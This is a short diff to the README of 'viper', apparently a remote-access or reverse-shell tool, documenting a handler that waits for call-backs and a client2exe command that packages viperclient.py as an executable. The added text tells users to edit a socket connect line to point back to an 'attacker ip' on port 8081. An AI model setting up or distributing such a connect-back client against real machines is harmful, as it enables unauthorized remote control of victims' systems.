@@ -43,7 +43,13 @@ viper main commands:
 
 [+] handler ========= > "starts the viper server and waits for a call back" 
 
-[*] client2exe ========= > "starts the viper server and waits for a call back"; todo but the manual method works fine. 
+[*] client2exe ========= > "creates a basic exe file from viperclient.py"; todo, change the ip address manualy in viperclient.py first. 
+
+Inside viper client modify these two lines with your ip address
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    s.connect(('address you want to connect back to, attacker ip', 8081))
 
 
 viper connection commands:
